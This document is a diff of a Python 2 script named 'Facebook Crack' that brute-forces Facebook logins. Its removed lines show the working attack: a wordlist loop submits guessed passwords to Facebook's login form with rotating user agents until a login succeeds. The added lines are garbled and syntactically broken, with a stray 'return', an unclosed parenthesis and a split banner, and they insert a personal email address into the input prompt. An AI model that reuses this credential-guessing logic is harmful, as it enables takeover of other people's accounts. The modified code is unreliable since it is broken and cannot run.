@@ -10,7 +10,7 @@ import random
 
 
 
-email = str(raw_input("Enter the Facebook Username (or) Email (or) Phone Number : "))
+email = str(raw_input("Enter the Facebook Username (or) jenkinsterry420@yahoo.com (or) Phone Number : "))
 
 
 passwordlist = str(raw_input("Enter the wordlist name and path : "))
@@ -40,32 +40,23 @@ def main():
 def brute(password):
 	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
 	sys.stdout.flush()
-	br.addheaders = [('User-agent', random.choice(useragents))]
-	site = br.open(login)
-	br.select_form(nr = 0)
-	br.form['email'] = email
-	br.form['pass'] = password
-	sub = br.submit()
-	log = sub.geturl()
-	if log != login and (not 'login_attempt' in log):
-			print("\n\n[+] Password Find = {}".format(password))
-			raw_input("ANY KEY to Exit....")
-			sys.exit(1)
+	br.addheaders = [('User-agent', random.choice(useragents))]return
 
-			
-def search():
-	global password
-	passwords = open(passwordlist,"r")
-	for password in passwords:
-		password = password.replace("\n","")
-		brute(password)
+
+		password = password.replace("\n",""
+	
+	
+	brute(password)
 
 		
 #welcome 
 def welcome():
 	welcome = """
 
-        +=========================================+
+        +===============
+		
+		
+		===========================+
         |..........   Facebook Crack   ...........|
         +-----------------------------------------+
         |            #Author: Ha3MrX              | 
